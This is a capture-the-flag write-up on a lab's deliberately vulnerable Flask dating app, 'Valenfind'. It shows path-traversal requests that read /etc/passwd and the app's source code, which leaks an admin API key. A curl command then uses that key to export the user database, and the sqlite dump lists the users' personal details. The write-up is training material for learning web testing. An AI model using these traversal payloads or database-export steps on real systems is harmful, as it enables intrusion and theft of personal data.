## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
# Valenfind
Can you find vulnerabilities in this new dating app?
My Dearest Hacker,
There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?
You can access it here: `http://MACHINE_IP:5000`
```
## IP-Address
```IP-Address
http://10.48.151.166:5000
```
## Login
- Sign up & Login and scroll to profile
```Burp
`GET /api/fetch_layout?layout=theme_classic.html`
```
- Got the Endpoint 
```burp
GET /api/fetch_layout?layout=/../../../etc/passwd
```
- Response 
```Response

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
```
  - Lets Analyze the `app.py` as its running flask in backend
  ```burp
  GET /api/fetch_layout?layout=../../app.py HTTP/1.1
	Host: 10.49.172.148:5000
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
	Accept: */*
	Accept-Language: en-GB,en;q=0.9
	Accept-Encoding: gzip, deflate, br
	Referer: http://10.49.172.148:5000/profile/cupid
	Connection: keep-alive
	Cookie: session=eyJsaWtlZCI6WzhdLCJ1c2VyX2lkIjo5LCJ1c2VybmFtZSI6InRlc3QifQ.aZJyDw.RPNcOt2BhpqqU5ancHH04VTBeEc
	Priority: u=0
  ```
  - Response
  ```Response
  
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "[api key omitted]"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            
            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')
  ```
  - Got Interesting details
  ```notes
  - ADMIN_API_KEY = "[api key omitted]"
    DATABASE = 'cupid.db'
  ```
  Lets extract the db
  ```bash
curl -H "X-Valentine-Token: [api key omitted]" http://10.49.172.148:5000/api/admin/export_db -o cupid.db
  ```
  - Ouput
```bash
 ls
burp.json   cupid.db  Downloads     Pictures  Rooms    snap               Tools
CTFBuilder  Desktop   Instructions  Postman   Scripts  thinclient_drives
```
- `Cupid.db`
```bash
root@ip-10-49-102-38:~# sqlite3 cupid.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|romeo_montague|[password omitted]|Romeo Montague|romeo@verona.cupid|555-0100-ROMEO|123 Balcony Way, Verona, VR 99999|Looking for my Juliet. Where art thou?|14|romeo.jpg
2|casanova_official|[password omitted]|Giacomo Casanova|loverboy@venice.kiss|555-0155-LOVE|101 Grand Canal St, Venice, Italy|Just here for the free chocolate.|5|casanova.jpg
3|cleopatra_queen|[password omitted]|Cleopatra VII Philopator|queen@nile.river|555-0001-NILE|Royal Palace, Alexandria, Egypt|I rule an empire, but I can't rule my heart. \U0001f40d|88|cleo.jpg
4|sherlock_h|[password omitted]|Sherlock Holmes|detective@baker.street|555-221B-KEYS|221B Baker Street, London, UK|Observant, logical, and looking for a mystery to solve (or a date).|21|sherlock.jpg
5|gatsby_great|[password omitted]|Jay Gatsby|jay@westegg.party|555-1922-RICH|Gatsby Mansion, West Egg, NY, USA|Throwing parties every weekend hoping you'll walk through the door.|105|gatsby.jpg
6|jane_eyre|[password omitted]|Jane Eyre|jane@thornfield.book|555-1847-READ|Thornfield Hall, Yorkshire, UK|Quiet, independent, and looking for a connection of the soul.|33|jane.jpg
7|count_dracula|[password omitted]|Vlad Dracula|vlad@night.walker|555-0666-BITE|Bran Castle, Transylvania, Romania|I love long walks at night and biting... necks? No, biting into life!|666|dracula.jpg
8|cupid|[password omitted]|System Administrator|cupid@internal.cupid|555-0000-ROOT|FLAG: [flag omitted]|I keep the database secure. No peeking.|1000|cupid.jpg
9|test|[password omitted]|admin|admin@valenfind|+919191919191|123213123123|123123|0|default.jpg
sqlite> 
```
## Root
```Flag
[flag omitted]
```
# END

